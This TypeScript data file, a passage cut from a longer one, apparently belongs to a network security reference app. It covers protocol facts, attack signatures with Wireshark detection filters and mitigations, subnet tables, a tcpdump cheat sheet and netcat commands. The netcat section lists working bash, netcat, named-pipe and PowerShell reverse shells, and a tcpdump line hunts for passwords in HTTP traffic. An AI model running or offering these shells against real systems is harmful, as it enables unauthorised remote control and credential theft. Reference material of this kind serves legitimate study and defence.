      'Type 3: Destination Unreachable — Code 0=net, 1=host, 3=port, 4=fragmentation needed (Path MTU)',
      'Type 5: Redirect — router tells host to use a better route (often exploited)',
      'Type 8: Echo Request (ping)',
      'Type 11: Time Exceeded — Code 0=TTL expired (traceroute), Code 1=fragment reassembly timeout',
      'Type 12: Parameter Problem — malformed IP header',
      'traceroute uses TTL expiry: sends packets with TTL=1,2,3... each router that drops the packet sends ICMP Type 11',
      'Path MTU Discovery: uses Type 3 Code 4 (fragmentation needed) to find maximum path MTU',
    ],
    securityNotes: [
      'ICMP tunneling: encode data in echo request/reply payload (ptunnel, icmptunnel) — bypasses TCP/UDP firewalls',
      'Smurf attack: spoof source as victim, send ICMP echo to broadcast → all hosts reply to victim (DDoS)',
      'ICMP redirect (Type 5): attacker sends ICMP redirect to reroute traffic through attacker',
      'Ping of Death: oversized ICMP packet causes buffer overflow (historical, patched)',
      'ICMP flood: overwhelm target with echo requests (ping flood)',
      'Covert channel indicators: ICMP payload larger than typical (>64 bytes), unusual payload content, high ICMP rate from single host',
    ],
    wiresharkTip: 'icmp — all ICMP. icmp.type == 8 — pings. icmp && frame.len > 100 — large ICMP (tunneling). Statistics → Protocol Hierarchy to see ICMP percentage of traffic.',
  },
  {
    protocol: 'ARP',
    overview: 'Address Resolution Protocol — maps IPv4 addresses to MAC addresses on a local network segment. Operates at layer 2/3 boundary.',
    ports: 'No ports — Ethernet type 0x0806',
    keyFacts: [
      'ARP Request (opcode 1): broadcast "Who has IP x.x.x.x? Tell IP y.y.y.y" — target MAC = ff:ff:ff:ff:ff:ff',
      'ARP Reply (opcode 2): unicast "IP x.x.x.x is at MAC aa:bb:cc:dd:ee:ff"',
      'Gratuitous ARP: device announces its own IP/MAC mapping — used during boot, IP change, failover',
      'ARP cache: each device stores IP→MAC mappings with expiry. Linux: arp -n or ip neigh show',
      'Proxy ARP: router answers ARP requests on behalf of hosts on another segment',
      'ARP is stateless: any device can send an ARP reply at any time — no challenge/response',
      'IPv6 uses NDP (Neighbor Discovery Protocol) instead of ARP — ICMPv6 Type 135/136',
    ],
    securityNotes: [
      'ARP poisoning/spoofing: send unsolicited ARP replies mapping victim IP to attacker MAC → all traffic through attacker (MitM). Tool: arpspoof, Ettercap, Bettercap',
      'ARP poisoning detection: ip neigh show — look for two IPs sharing same MAC. Wireshark: arp.duplicate-address-detected',
      'ARP cache overflow: flood ARP table to exhaust switch memory → switch enters fail-open (hub mode) → all traffic visible',
      'Dynamic ARP Inspection (DAI): switch feature that validates ARP packets against DHCP snooping table',
      'Static ARP entries: prevent poisoning for critical hosts (default gateway). arp -s ip mac',
      'ARP monitoring: watch for MAC address changes on critical IPs — legitimate change (NIC replacement) vs attack',
    ],
    wiresharkTip: 'arp — all ARP. arp.opcode == 1 — requests. arp.duplicate-address-detected — poisoning alert. arp.src.hw_mac contains "00:0c:29" — VMware MAC prefix (useful for lab identification).',
  },
  {
    protocol: 'SMB',
    overview: 'Server Message Block — Windows file sharing, printer sharing, and named pipe IPC. SMBv1 is critically insecure. SMBv3 with encryption is current standard.',
    ports: 'TCP 445 (direct SMB), TCP 139 (SMB over NetBIOS)',
    keyFacts: [
      'SMBv1: completely deprecated. EternalBlue (MS17-010) exploit targets SMBv1. Must be disabled.',
      'SMBv2: introduced in Vista. Reduced command count, compound requests, better performance.',
      'SMBv3: introduced in Windows 8/Server 2012. Supports encryption (SMB Encryption), secure dialect negotiation, multichannel.',
      'Named pipes: IPC mechanism over SMB. Used by many Windows services (MSRPC, WMI, etc.)',
      'Authentication: NTLM (challenge-response) or Kerberos. Kerberos preferred in AD environments.',
      'SMB Signing: ensures packets not tampered in transit. Domain controllers sign by default. Workstations often do not.',
      'Administrative shares: C$, D$, ADMIN$, IPC$ — accessible to local admins',
    ],
    securityNotes: [
      'EternalBlue (CVE-2017-0144): unauthenticated RCE via SMBv1 buffer overflow. Used by WannaCry and NotPetya.',
      'NTLM relay: capture NTLM auth challenge-response and relay to another server. Responder + ntlmrelayx.',
      'Pass-the-Hash: use NTLM hash directly without knowing password. Lateral movement via SMB.',
      'SMB null session: anonymous IPC$ connection to enumerate users, shares, policies (older Windows).',
      'PrintNightmare (CVE-2021-34527): Windows Print Spooler RCE via SMB.',
      'SMB Signing disabled: prerequisite for NTLM relay attacks. Check: nmap --script smb-security-mode',
      'SMB detection: nmap -p 445 --script=smb-vuln-ms17-010,smb-security-mode target',
    ],
    wiresharkTip: 'smb || smb2 — all SMB traffic. smb2.cmd == 5 — SMB2 Create (file open/create). smb2.cmd == 11 — IOCTL requests (named pipes). ntlmssp — NTLM auth exchanges.',
  },
]

// ─── Network Attack Signatures ───────────────────────────────────────────────

export interface AttackSignature {
  name: string
  category: string
  description: string
  networkIndicators: string[]
  wiresharkFilter?: string
  nmapDetect?: string
  mitigations: string[]
  severity: 'CRITICAL' | 'HIGH' | 'MED'
}

export const attackSignatures: AttackSignature[] = [
  // Scanning
  {
    name: 'Port Scan (SYN)',
    category: 'Reconnaissance',
    severity: 'MED',
    description: 'Attacker sends SYN packets to many ports to discover open services. Incomplete TCP handshakes (no data follows).',
    networkIndicators: [
      'Single source IP → many destination ports in short timeframe',
      'Many TCP SYN packets with no corresponding ACK or data',
      'RST packets from target (closed ports) vastly outnumber SYN-ACKs (open ports)',
      'Sequential or randomized port progression from one source',
    ],
    wiresharkFilter: 'tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.src == <scanner>',
    mitigations: ['Rate-limit inbound SYN packets', 'IDS/IPS with port scan detection (Snort: portscan preprocessor)', 'Firewall logging with anomaly detection'],
  },
  {
    name: 'ARP Poisoning / MITM',
    category: 'Layer 2 Attack',
    severity: 'CRITICAL',
    description: 'Attacker sends gratuitous ARP replies to associate their MAC with a legitimate IP (gateway or target), redirecting traffic through attacker for interception.',
    networkIndicators: [
      'Gratuitous ARP replies not following a request',
      'Multiple ARP replies for the same IP from different MACs',
      'MAC address for default gateway suddenly changes',
      'Duplicate IP detection alerts in Wireshark (arp.duplicate-address-detected)',
      'Increased latency on network (traffic taking extra hop)',
    ],
    wiresharkFilter: 'arp.opcode == 2 && arp.duplicate-address-detected',
    mitigations: ['Dynamic ARP Inspection (DAI) on managed switches', 'Static ARP entries for critical hosts', 'HTTPS everywhere (TLS protects against content interception)', 'Network monitoring for MAC/IP mapping changes'],
  },
  {
    name: 'NTLM Relay',
    category: 'Credential Attack',
    severity: 'CRITICAL',
    description: 'Attacker captures NTLM authentication challenge-response (via poisoning or MitM) and relays it to a different target server to authenticate as the victim.',
    networkIndicators: [
      'LLMNR/NBT-NS queries for non-existent hostnames (Responder bait)',
      'NTLM authentication to unexpected hosts',
      'SMB connections from workstations directly to attacker IP',
      'Authentication events on servers with source IP being another workstation (not domain controller)',
    ],
    wiresharkFilter: 'ntlmssp || llmnr || nbns',
    mitigations: ['Disable LLMNR and NBT-NS (primary poisoning vectors)', 'Enable SMB Signing on all systems (prevents relay)', 'Enable Extended Protection for Authentication (EPA)', 'Network segmentation preventing workstation-to-workstation SMB'],
  },
  {
    name: 'DNS Tunneling',
    category: 'Covert Channel / C2',
    severity: 'HIGH',
    description: 'Data encoded in DNS subdomain labels or TXT records to tunnel traffic through DNS port 53, bypassing firewalls that allow DNS but block other protocols.',
    networkIndicators: [
      'High volume of DNS queries to single external domain',
      'Unusually long subdomain labels (>50 chars) or total query length',
      'Base32/Base64 character patterns in subdomains',
      'DNS queries containing hex strings or random-looking labels',
      'TXT record queries/responses with unusual payload size',
      'High query rate for domain with no legitimate web presence',
      'DNS traffic volume anomaly: normal orgs: 5-10% of traffic is DNS',
    ],
    wiresharkFilter: 'dns && (frame.len > 512 || dns.qry.name matches "[a-z0-9]{20,}")',
    mitigations: ['DNS filtering/RPZ with anomaly detection', 'Monitor DNS query volume per domain', 'Block or restrict outbound DNS to internal resolvers only', 'Inspect DNS payloads for encoding patterns'],
  },
  {
    name: 'ICMP Tunneling',
    category: 'Covert Channel / C2',
    severity: 'HIGH',
    description: 'Data encoded in ICMP echo request/reply payloads to create a covert channel, bypassing firewalls that permit ICMP but block TCP/UDP.',
    networkIndicators: [
      'ICMP packets with payload larger than typical (>64 bytes for standard ping)',
      'Non-random payload in ICMP packets (structured data, repeated patterns)',
      'Bidirectional ICMP traffic between two hosts over extended period',
      'ICMP packets at regular intervals (beaconing)',
      'Large ICMP packets (>1000 bytes)',
    ],
    wiresharkFilter: 'icmp && frame.len > 100',
    mitigations: ['Block ICMP at perimeter (accept only from monitoring infrastructure)', 'Rate-limit ICMP', 'DPI inspection of ICMP payload content', 'Monitor for ICMP to unusual external destinations'],
  },
  {
    name: 'SMB EternalBlue (MS17-010)',
    category: 'Exploitation',
    severity: 'CRITICAL',
    description: 'Buffer overflow in SMBv1 transaction handling allows unauthenticated remote code execution as SYSTEM. Exploited by WannaCry and NotPetya.',
    networkIndicators: [
      'Inbound connection on TCP 445',
      'SMBv1 negotiation in SMB dialect negotiation packets',
      'Trans2 or NT_TRANSACT requests with malformed data',
      'Large SMB packets followed by shellcode patterns',
      'Outbound SMB connections from normally non-server hosts',
    ],
    wiresharkFilter: 'smb && smb.cmd == 0x32',
    nmapDetect: 'nmap -p 445 --script=smb-vuln-ms17-010 <target>',
    mitigations: ['Patch MS17-010 (critical — apply immediately)', 'Disable SMBv1 completely', 'Block TCP 445 at network perimeter', 'Segment networks to prevent SMB between workstations'],
  },
  {
    name: 'Kerberoasting',
    category: 'Credential Attack',
    severity: 'HIGH',
    description: 'Request Kerberos service tickets (TGS) for service accounts with SPNs. Tickets are encrypted with the service account\'s NTLM hash — crack offline.',
    networkIndicators: [
      'Kerberos TGS-REQ (type 12) for RC4 encryption (etype 23) — legacy, weaker',
      'Multiple TGS requests from single user in short timeframe',
      'TGS requests for services the user doesn\'t normally access',
      'Port 88 Kerberos traffic from unexpected hosts',
    ],
    wiresharkFilter: 'kerberos.msg_type == 12',
    mitigations: ['Use AES-256 (etype 18) for service accounts — makes offline cracking impractical', 'Managed Service Accounts (MSAs) with 240-char random passwords', 'Monitor for multiple TGS requests with etype 23', 'Principle of least privilege for service accounts'],
  },
  {
    name: 'LLMNR/NBT-NS Poisoning',
    category: 'Credential Attack',
    severity: 'HIGH',
    description: 'Windows falls back to LLMNR/NBT-NS for name resolution when DNS fails. Attacker responds to these broadcasts claiming to be the requested host, capturing NTLM hashes.',
    networkIndicators: [
      'LLMNR queries (UDP 5355) for non-existent hostnames',
      'NBT-NS queries (UDP 137) for non-existent hostnames',
      'Rapid responses to LLMNR/NBT-NS queries from non-authoritative host',
      'NTLM authentication attempts to attacker IP following name resolution',
    ],
    wiresharkFilter: 'llmnr || nbns',
    mitigations: ['Disable LLMNR via GPO: Computer Config → Admin Templates → Network → DNS Client → Turn off multicast name resolution', 'Disable NBT-NS via DHCP option 001 or NIC properties', 'Use DNS with proper entries for all hosts'],
  },
  {
    name: 'SYN Flood',
    category: 'DoS/DDoS',
    severity: 'HIGH',
    description: 'Attacker sends massive volume of SYN packets, exhausting server\'s half-open connection table (backlog queue). Server can\'t accept legitimate connections.',
    networkIndicators: [
      'Massive volume of SYN packets from single or spoofed sources',
      'Many half-open connections in server netstat (SYN_RECEIVED state)',
      'SYN packets with spoofed source IPs that never send ACK',
      'Source IPs from disparate geographic locations (spoofed or botnet)',
    ],
    wiresharkFilter: 'tcp.flags.syn == 1 && tcp.flags.ack == 0',
    mitigations: ['SYN cookies: encode connection state in ISN instead of storing in memory', 'Rate-limit SYN packets per source IP', 'Upstream ISP-level filtering (contact ISP during attack)', 'IPS with SYN flood detection threshold'],
  },
  {
    name: 'DNS Amplification DDoS',
    category: 'DoS/DDoS',
    severity: 'HIGH',
    description: 'Attacker spoofs victim\'s IP as source of DNS ANY or large queries sent to open resolvers. Resolvers send large responses to victim — amplification factor up to 70x.',
    networkIndicators: [
      'High volume of DNS responses from multiple external resolvers',
      'DNS responses much larger than typical (>512 bytes)',
      'DNS responses without corresponding outbound queries from victim',
      'Source IPs are legitimate DNS resolvers (8.8.8.8, etc.)',
      'DNS ANY query type in responses',
    ],
    wiresharkFilter: 'dns && dns.flags.response == 1 && frame.len > 512',
    mitigations: ['BCP38: network ingress filtering prevents IP spoofing at source', 'Rate-limit DNS responses on open resolvers', 'Disable DNS ANY responses on authoritative servers', 'Upstream scrubbing center during active attack'],
  },
  {
    name: 'HTTP Brute Force / Credential Stuffing',
    category: 'Credential Attack',
    severity: 'MED',
    description: 'Automated attempts to guess credentials against login endpoints. Credential stuffing uses known username/password pairs from breaches.',
    networkIndicators: [
      'High volume of POST requests to login endpoints (/login, /auth, /wp-login.php)',
      'HTTP 401/403 responses at high rate',
      'Many authentication attempts from single IP or IP range',
      'User-Agent strings matching automation tools (Python-requests, Go-http-client, curl)',
      'Sequential username enumeration patterns',
    ],
    wiresharkFilter: 'http.request.method == "POST" && http.request.uri contains "login"',
    mitigations: ['Account lockout after N failures', 'CAPTCHA on login forms', 'Multi-factor authentication', 'IP-based rate limiting', 'Geo-blocking for unexpected source countries'],
  },
  {
    name: 'Beaconing (C2)',
    category: 'Malware / C2',
    severity: 'CRITICAL',
    description: 'Malware makes periodic outbound connections to C2 server to receive commands and exfiltrate data. Often disguised as normal web traffic.',
    networkIndicators: [
      'Regular periodic connections at fixed intervals (e.g., every 60s, 5min, hourly)',
      'Outbound connections to unusual external IPs or domains on standard ports (80/443)',
      'Small consistent data transfer each beacon (check-in payload)',
      'Connections outside of business hours from workstations',
      'JA3/JA3S TLS fingerprint matching known implants',
      'Domain generation algorithm (DGA) patterns — random-looking domains',
    ],
    wiresharkFilter: 'http.request && ip.dst != <known_good_ranges>',
    mitigations: ['DNS RPZ blocking known C2 domains', 'JA3 TLS fingerprinting at perimeter', 'Proxy all outbound HTTP/S through web proxy with inspection', 'Anomaly detection on outbound connection timing patterns', 'Network segmentation limiting workstation outbound access'],
  },
]
// ─── Subnet / CIDR Quick Reference ───────────────────────────────────────────

export interface CIDREntry {
  prefix: number
  subnetMask: string
  wildcardMask: string
  totalAddresses: number
  usableHosts: number
  notes: string
}

export const cidrTable: CIDREntry[] = [
  { prefix: 32, subnetMask: '255.255.255.255', wildcardMask: '0.0.0.0',     totalAddresses: 1,          usableHosts: 1,          notes: 'Host route — single IP' },
  { prefix: 31, subnetMask: '255.255.255.254', wildcardMask: '0.0.0.1',     totalAddresses: 2,          usableHosts: 2,          notes: 'Point-to-point link (RFC 3021) — no network/broadcast' },
  { prefix: 30, subnetMask: '255.255.255.252', wildcardMask: '0.0.0.3',     totalAddresses: 4,          usableHosts: 2,          notes: 'Minimal subnet — router-to-router' },
  { prefix: 29, subnetMask: '255.255.255.248', wildcardMask: '0.0.0.7',     totalAddresses: 8,          usableHosts: 6,          notes: 'Small LAN segment' },
  { prefix: 28, subnetMask: '255.255.255.240', wildcardMask: '0.0.0.15',    totalAddresses: 16,         usableHosts: 14,         notes: '' },
  { prefix: 27, subnetMask: '255.255.255.224', wildcardMask: '0.0.0.31',    totalAddresses: 32,         usableHosts: 30,         notes: '' },
  { prefix: 26, subnetMask: '255.255.255.192', wildcardMask: '0.0.0.63',    totalAddresses: 64,         usableHosts: 62,         notes: '' },
  { prefix: 25, subnetMask: '255.255.255.128', wildcardMask: '0.0.0.127',   totalAddresses: 128,        usableHosts: 126,        notes: 'Half of a /24' },
  { prefix: 24, subnetMask: '255.255.255.0',   wildcardMask: '0.0.0.255',   totalAddresses: 256,        usableHosts: 254,        notes: 'Class C — most common LAN size' },
  { prefix: 23, subnetMask: '255.255.254.0',   wildcardMask: '0.0.1.255',   totalAddresses: 512,        usableHosts: 510,        notes: '2× /24' },
  { prefix: 22, subnetMask: '255.255.252.0',   wildcardMask: '0.0.3.255',   totalAddresses: 1024,       usableHosts: 1022,       notes: '4× /24' },
  { prefix: 21, subnetMask: '255.255.248.0',   wildcardMask: '0.0.7.255',   totalAddresses: 2048,       usableHosts: 2046,       notes: '8× /24' },
  { prefix: 20, subnetMask: '255.255.240.0',   wildcardMask: '0.0.15.255',  totalAddresses: 4096,       usableHosts: 4094,       notes: '16× /24' },
  { prefix: 19, subnetMask: '255.255.224.0',   wildcardMask: '0.0.31.255',  totalAddresses: 8192,       usableHosts: 8190,       notes: '' },
  { prefix: 18, subnetMask: '255.255.192.0',   wildcardMask: '0.0.63.255',  totalAddresses: 16384,      usableHosts: 16382,      notes: '' },
  { prefix: 17, subnetMask: '255.255.128.0',   wildcardMask: '0.0.127.255', totalAddresses: 32768,      usableHosts: 32766,      notes: 'Half of a /16' },
  { prefix: 16, subnetMask: '255.255.0.0',     wildcardMask: '0.0.255.255', totalAddresses: 65536,      usableHosts: 65534,      notes: 'Class B — 172.16.x.x, 192.168.x.x' },
  { prefix: 15, subnetMask: '255.254.0.0',     wildcardMask: '0.1.255.255', totalAddresses: 131072,     usableHosts: 131070,     notes: '' },
  { prefix: 14, subnetMask: '255.252.0.0',     wildcardMask: '0.3.255.255', totalAddresses: 262144,     usableHosts: 262142,     notes: '' },
  { prefix: 12, subnetMask: '255.240.0.0',     wildcardMask: '0.15.255.255',totalAddresses: 1048576,    usableHosts: 1048574,    notes: '172.16.0.0/12 — RFC 1918 private' },
  { prefix: 10, subnetMask: '255.192.0.0',     wildcardMask: '0.63.255.255',totalAddresses: 4194304,    usableHosts: 4194302,    notes: '' },
  { prefix: 8,  subnetMask: '255.0.0.0',       wildcardMask: '0.255.255.255',totalAddresses: 16777216,  usableHosts: 16777214,   notes: 'Class A — 10.0.0.0/8 RFC 1918' },
]

export const specialRanges = [
  { range: '10.0.0.0/8',        purpose: 'Private (RFC 1918)',       notes: 'Large enterprise networks. 16.7M addresses.' },
  { range: '172.16.0.0/12',     purpose: 'Private (RFC 1918)',       notes: '172.16.0.0 – 172.31.255.255. Medium networks.' },
  { range: '192.168.0.0/16',    purpose: 'Private (RFC 1918)',       notes: 'SOHO and home networks.' },
  { range: '127.0.0.0/8',       purpose: 'Loopback',                 notes: '127.0.0.1 most common. OS never routes to wire.' },
  { range: '169.254.0.0/16',    purpose: 'Link-local (APIPA)',       notes: 'Auto-assigned when DHCP fails. Not routable.' },
  { range: '0.0.0.0/8',         purpose: 'This network',             notes: 'Source address during DHCP negotiation.' },
  { range: '100.64.0.0/10',     purpose: 'CGNAT (RFC 6598)',         notes: 'Carrier-grade NAT — ISP shared address space.' },
  { range: '192.0.2.0/24',      purpose: 'TEST-NET-1 (RFC 5737)',    notes: 'Documentation/examples only. Never routed.' },
  { range: '198.51.100.0/24',   purpose: 'TEST-NET-2 (RFC 5737)',    notes: 'Documentation only.' },
  { range: '203.0.113.0/24',    purpose: 'TEST-NET-3 (RFC 5737)',    notes: 'Documentation only.' },
  { range: '224.0.0.0/4',       purpose: 'Multicast (RFC 5771)',     notes: '224.0.0.0–239.255.255.255. OSPF: 224.0.0.5/6.' },
  { range: '240.0.0.0/4',       purpose: 'Reserved (Class E)',       notes: 'Future use. Not deployed.' },
  { range: '255.255.255.255/32', purpose: 'Broadcast',               notes: 'Limited broadcast — not forwarded by routers.' },
]

// ─── tcpdump Cheat Sheet ──────────────────────────────────────────────────────

export interface TcpdumpCommand {
  category: string
  cmd: string
  description: string
  notes?: string
}

export const tcpdumpCommands: TcpdumpCommand[] = [
  // Capture basics
  { category: 'Capture basics', cmd: 'tcpdump -i eth0', description: 'Capture on interface eth0' },
  { category: 'Capture basics', cmd: 'tcpdump -i any', description: 'Capture on all interfaces' },
  { category: 'Capture basics', cmd: 'tcpdump -D', description: 'List available interfaces' },
  { category: 'Capture basics', cmd: 'tcpdump -i eth0 -w capture.pcap', description: 'Write to file (no live output)' },
  { category: 'Capture basics', cmd: 'tcpdump -r capture.pcap', description: 'Read from saved file' },
  { category: 'Capture basics', cmd: 'tcpdump -i eth0 -c 100', description: 'Capture exactly 100 packets then stop' },
  { category: 'Capture basics', cmd: 'tcpdump -i eth0 -s 0', description: 'Capture full packet (default snaplen is 65535 on modern tcpdump; older default was 68 bytes — always set -s 0 to be safe)' },
  // Output formatting
  { category: 'Output', cmd: 'tcpdump -n', description: 'No DNS resolution — show IPs instead of hostnames (faster)' },
  { category: 'Output', cmd: 'tcpdump -nn', description: 'No DNS + no port name resolution (fastest, unambiguous)' },
  { category: 'Output', cmd: 'tcpdump -v', description: 'Verbose — show TTL, IP options, checksum' },
  { category: 'Output', cmd: 'tcpdump -vv', description: 'More verbose — full protocol decode' },
  { category: 'Output', cmd: 'tcpdump -vvv', description: 'Maximum verbosity' },
  { category: 'Output', cmd: 'tcpdump -X', description: 'Show packet data as hex AND ASCII side-by-side' },
  { category: 'Output', cmd: 'tcpdump -A', description: 'Show packet data as ASCII only (good for HTTP)' },
  { category: 'Output', cmd: 'tcpdump -e', description: 'Show Ethernet (layer 2) header — MAC addresses' },
  { category: 'Output', cmd: 'tcpdump -t', description: 'No timestamp', notes: '-tt = Unix epoch, -ttt = delta between packets, -tttt = full date+time, -ttttt = delta from first packet' },
  { category: 'Output', cmd: 'tcpdump -q', description: 'Quiet — minimal protocol info' },
  // Capture filters (BPF syntax)
  { category: 'Capture filters', cmd: 'tcpdump host 192.168.1.100', description: 'All traffic to or from IP' },
  { category: 'Capture filters', cmd: 'tcpdump src 192.168.1.100', description: 'Traffic FROM source IP' },
  { category: 'Capture filters', cmd: 'tcpdump dst 192.168.1.100', description: 'Traffic TO destination IP' },
  { category: 'Capture filters', cmd: 'tcpdump net 192.168.1.0/24', description: 'All traffic on subnet' },
  { category: 'Capture filters', cmd: 'tcpdump port 443', description: 'Traffic on port 443 (src or dst)' },
  { category: 'Capture filters', cmd: 'tcpdump src port 53', description: 'DNS responses (source port 53)' },
  { category: 'Capture filters', cmd: 'tcpdump tcp', description: 'TCP traffic only' },
  { category: 'Capture filters', cmd: 'tcpdump udp', description: 'UDP traffic only' },
  { category: 'Capture filters', cmd: 'tcpdump icmp', description: 'ICMP traffic only' },
  { category: 'Capture filters', cmd: "tcpdump 'tcp[tcpflags] & tcp-syn != 0'", description: 'TCP SYN packets (new connections)', notes: 'BPF access to specific TCP flags' },
  { category: 'Capture filters', cmd: "tcpdump 'tcp[tcpflags] == tcp-syn|tcp-ack'", description: 'TCP SYN-ACK packets' },
  { category: 'Capture filters', cmd: "tcpdump 'tcp[tcpflags] & tcp-rst != 0'", description: 'TCP RST packets' },
  { category: 'Capture filters', cmd: "tcpdump 'ip[6:2] & 0x1fff != 0'", description: 'IP fragments' },
  { category: 'Capture filters', cmd: 'tcpdump not port 22', description: 'Exclude SSH (avoid capturing your own session)' },
  { category: 'Capture filters', cmd: 'tcpdump host 10.0.0.1 and port 80', description: 'Combine filters with and/or/not' },
  { category: 'Capture filters', cmd: "tcpdump 'greater 1000'", description: 'Packets larger than 1000 bytes' },
  { category: 'Capture filters', cmd: "tcpdump 'ether[0] & 1 = 0'", description: 'Unicast only (exclude multicast/broadcast)' },
  // Ring buffer / rotation
  { category: 'Ring buffer', cmd: 'tcpdump -i eth0 -w capture-%Y%m%d%H%M%S.pcap -G 3600', description: 'Rotate file every 3600 seconds (1 hour)', notes: '-G = rotate interval in seconds. Strftime format in filename.' },
  { category: 'Ring buffer', cmd: 'tcpdump -i eth0 -w capture.pcap -C 100', description: 'Rotate file every 100 MB', notes: '-C = max file size in MB. Files: capture.pcap, capture.pcap1, capture.pcap2...' },
  { category: 'Ring buffer', cmd: 'tcpdump -i eth0 -w capture.pcap -C 100 -W 10', description: 'Ring buffer: 10 files × 100 MB = 1 GB max, then overwrite', notes: '-W = max number of files. Oldest file overwritten when limit reached.' },
  { category: 'Ring buffer', cmd: 'tcpdump -i eth0 -w /tmp/cap.pcap -C 50 -W 20 -z gzip', description: 'Compress rotated files with gzip', notes: '-z <program> = post-rotation compression command' },
  // Useful combos
  { category: 'Useful combos', cmd: 'tcpdump -i eth0 -nn -s 0 -w - | wireshark -k -S -i -', description: 'Live pipe to Wireshark on same machine' },
  { category: 'Useful combos', cmd: 'ssh user@host "tcpdump -i eth0 -nn -s 0 -w - not port 22" | wireshark -k -S -i -', description: 'Capture on remote host, analyze in local Wireshark', notes: '"not port 22" prevents SSH session traffic from polluting capture' },
  { category: 'Useful combos', cmd: 'tcpdump -i eth0 -nn -A port 80 | grep -i "user-agent\\|host\\|password\\|authorization"', description: 'Live HTTP credential hunting' },
  { category: 'Useful combos', cmd: 'tcpdump -i eth0 -nn udp port 53 -v', description: 'DNS query monitoring with verbose decode' },
  { category: 'Useful combos', cmd: "tcpdump -i eth0 'tcp[32:4] = 0x47455420 or tcp[32:4] = 0x504f5354'", description: 'Match HTTP GET and POST by hex pattern in payload', notes: '0x47455420 = "GET ", 0x504f5354 = "POST"' },
]

// ─── Netcat / Ncat Reference ──────────────────────────────────────────────────

export interface NcCommand {
  category: string
  cmd: string
  description: string
  notes?: string
  variant?: 'nc' | 'ncat' | 'both'
}

export const ncCommands: NcCommand[] = [
  // Listeners
  { category: 'Listeners', cmd: 'nc -lvp 4444', description: 'Listen on port 4444 (verbose)', variant: 'nc', notes: '-l=listen, -v=verbose, -p=port. Add -n to skip DNS.' },
  { category: 'Listeners', cmd: 'ncat -lvp 4444', description: 'Ncat listener (nmap suite)', variant: 'ncat' },
  { category: 'Listeners', cmd: 'nc -lvnp 4444', description: 'Listen, verbose, no DNS, on port 4444', variant: 'nc' },
  { category: 'Listeners', cmd: 'ncat -lvp 4444 --ssl', description: 'TLS-encrypted listener', variant: 'ncat', notes: 'Ncat only. Generates self-signed cert automatically.' },
  { category: 'Listeners', cmd: 'ncat -lvp 4444 --ssl --ssl-cert cert.pem --ssl-key key.pem', description: 'TLS listener with specific certificate', variant: 'ncat' },
  // Connect
  { category: 'Connect', cmd: 'nc 10.0.0.1 4444', description: 'Connect to host on port 4444', variant: 'both' },
  { category: 'Connect', cmd: 'nc -v 10.0.0.1 4444', description: 'Connect with verbose output', variant: 'both' },
  { category: 'Connect', cmd: 'nc -w 5 10.0.0.1 4444', description: 'Connect with 5-second timeout', variant: 'both' },
  { category: 'Connect', cmd: 'ncat --ssl 10.0.0.1 4444', description: 'Connect with TLS', variant: 'ncat' },
  // Port scanning
  { category: 'Port scan', cmd: 'nc -zvn 10.0.0.1 1-1024', description: 'TCP port scan range 1–1024', variant: 'nc', notes: '-z=zero-I/O mode (scan only, no data). Slow — use nmap instead.' },
  { category: 'Port scan', cmd: 'nc -zvnu 10.0.0.1 1-1024', description: 'UDP port scan', variant: 'nc' },
  { category: 'Port scan', cmd: 'nc -zvn 10.0.0.1 22 80 443 3389', description: 'Scan specific ports', variant: 'nc' },
  // File transfer
  { category: 'File transfer', cmd: 'nc -lvp 9999 > received_file', description: 'Receiver: listen and save incoming data to file', variant: 'both' },
  { category: 'File transfer', cmd: 'nc 10.0.0.1 9999 < file_to_send', description: 'Sender: send file to listener', variant: 'both', notes: 'No progress indication. Connection closes when file completes.' },
  { category: 'File transfer', cmd: 'nc -lvp 9999 | tar xzvf -', description: 'Receive and extract tar archive', variant: 'both' },
  { category: 'File transfer', cmd: 'tar czvf - /path/to/dir | nc 10.0.0.1 9999', description: 'Compress directory and send', variant: 'both' },
  { category: 'File transfer', cmd: 'nc -lvp 9999 > file & nc 10.0.0.1 9999 < file', description: 'Bi-directional file copy pattern', variant: 'both' },
  // Reverse shells
  { category: 'Reverse shells', cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', description: 'Bash reverse shell (Linux)', variant: 'both', notes: 'Run on target. Catch with: nc -lvp 4444 on attacker.' },
  { category: 'Reverse shells', cmd: 'nc -e /bin/bash 10.0.0.1 4444', description: 'Netcat reverse shell (-e flag)', variant: 'nc', notes: '-e not available in OpenBSD nc. Use ncat or bash method instead.' },
  { category: 'Reverse shells', cmd: 'ncat -e /bin/bash 10.0.0.1 4444', description: 'Ncat reverse shell', variant: 'ncat' },
  { category: 'Reverse shells', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f', description: 'Netcat reverse shell via named pipe (no -e required)', variant: 'nc' },
  { category: 'Reverse shells', cmd: 'powershell -c "$client=New-Object Net.Sockets.TCPClient(\'10.0.0.1\',4444);$s=$client.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}"', description: 'Windows PowerShell reverse shell', variant: 'both' },
  // Shell upgrade
  { category: 'Shell upgrade', cmd: 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', description: 'Upgrade to PTY after catching reverse shell', notes: 'Then: Ctrl+Z, stty raw -echo, fg, reset. Gets proper terminal.' },
  { category: 'Shell upgrade', cmd: 'ncat -lvp 4444 --sh-exec /bin/bash', description: 'Ncat bind shell (serve /bin/bash to connecting client)', variant: 'ncat' },
  // Misc
  { category: 'Misc', cmd: 'nc -lvp 80 < index.html', description: 'Simple one-shot HTTP server (one request)', variant: 'both' },
  { category: 'Misc', cmd: 'nc -u -lvp 5005', description: 'UDP listener', variant: 'both', notes: '-u = UDP mode' },
  { category: 'Misc', cmd: 'echo "HEAD / HTTP/1.0\\r\\n\\r\\n" | nc -w3 10.0.0.1 80', description: 'HTTP banner grab', variant: 'both' },
  { category: 'Misc', cmd: 'ncat --broker --listen -p 4444', description: 'Ncat connection broker — connects multiple clients together', variant: 'ncat' },
]

// ─── Firewall Rules ───────────────────────────────────────────────────────────

export interface FirewallRule {
  category: string
  tool: string
  cmd: string
  description: string
  notes?: string
}

export const firewallRules: FirewallRule[] = [
  // iptables basics
